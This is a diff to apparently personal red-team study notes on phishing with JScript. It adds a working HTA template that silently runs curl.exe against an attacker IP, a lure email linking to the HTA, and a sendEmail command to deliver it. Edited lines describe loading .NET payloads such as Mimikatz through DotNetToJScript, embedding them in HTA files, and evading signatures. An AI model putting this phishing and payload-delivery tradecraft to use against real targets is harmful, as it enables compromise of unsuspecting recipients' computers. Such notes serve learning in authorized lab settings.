@@ -1,5 +1,5 @@
 ---
-title: Phishing with Jscript
+title: Phishing with Jscript (for emails)
 draft: false
 tags:
   - red-teaming
@@ -16,7 +16,7 @@ JScript files (`.js`, `.jse`) are executed by `wscript.exe` (GUI, default) or `c
 **Advantages over VBA macros:**
 - No requirement for Microsoft Office to be installed
 - No "Enable Content" / macro security warning (WSH runs `.js` files directly)
-- Can be delivered as email attachments, inside ZIPs, or via HTML smuggling
+- Can be delivered as **email attachments**, inside ZIPs, or via HTML smuggling
 - Supports COM interop, allowing interaction with virtually any Windows API
 
 > [!Note]
@@ -51,6 +51,49 @@ shell.ExpandEnvironmentStrings("%TEMP%");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 fso.FileExists("C:\\file.txt");
 fso.GetTempName();
+```
+
+# HTA Template
+
+1. Create a poc.hta:
+```html
+<html>
+<head>
+<script>
+	// Here we place our Jscript code
+    var ip = "192.168.45.161";
+    var payload = 'curl.exe http://' + ip + '/';
+    new ActiveXObject('WScript.Shell').Run(payload, 0, false);
+</script>
+</head>
+<body>
+    <h1>HTA POC</h1>
+    <script>
+        self.close();
+    </script>
+</body>
+</html>
+```
+
+2. Place the hta poc into `/var/www/html` folder.
+
+3. Send a phishing email that downloads and opens the malicious HTA application with a body like (email.html):
+```html
+Please click in this link: http://192.168.45.161/poc.hta
+```
+
+4. Send a phishing email that opens the malicious HTA application:
+```bash
+$ sendEmail -s 192.168.50.121 -t offsec@corp1.com -f attacker@corp1.com -u "test"  -o message-content-type=html -o message-file=./email.html -a iCalendar.ics
+
+Parameters
+-s: SMTP server address
+-t: target recipient
+-f: sender address
+-u: subject
+-o message-content-type: format the message as HTML
+-o message-file: crafted template
+-a: attachment
 ```
 
 ---
@@ -208,7 +251,7 @@ msf> run
 DotNetToJScript is a technique that allows executing arbitrary .NET assemblies from JScript or VBScript by abusing COM serialization. This enables running C# shellcode runners, tools like Mimikatz, or any .NET payload — entirely from a `.js` file, with no EXE dropped to disk.
 
 > [!Note]
-> This technique is for executing C# code from Jscript.
+> This technique is for executing C# code from Jscript. Useful to combine with HTA.
 
 **How it works:** JScript uses `DotNetToJScript.exe` (a tool) to generate a `.js` file that, when executed, deserializes and loads a .NET assembly from a base64 blob embedded in the script. The .NET assembly then executes your payload.
 
@@ -303,7 +346,7 @@ C:\> DotNetToJScript.exe TestClass.dll --lang=JScript --ver=v4 -o payload.js
 > C:\> C:\Tools\DotNetToJScript-master\DotNetToJScript-master\DotNetToJScript\bin\Release\DotNetToJScript.exe C:\Tools\DotNetToJScript-master\DotNetToJScript-master\ExampleAssembly\bin\Release\ExampleAssembly.dll --lang=JScript --ver=v4 -o payload.js
 > ```
 
-6. The resulting `payload.js` is a self-contained JScript file that loads and runs the .NET assembly when executed. Deliver to the victim via the usual methods (ZIP attachment, HTML smuggling, email).
+6. The resulting `payload.js` is a self-contained JScript file that loads and runs the .NET assembly when executed. Deliver to the victim via the usual methods (ZIP attachment, HTML smuggling, email). Also we can copy the contents of the JS file and paste them as payloads in an HTA application to deliver via email.
 
 > [!Warning] OPSEC
 > - `VirtualAlloc` with `RWX` (0x40) is the most-signatured memory allocation pattern. Use RW first, then `VirtualProtect` to flip to RX before `CreateThread`.
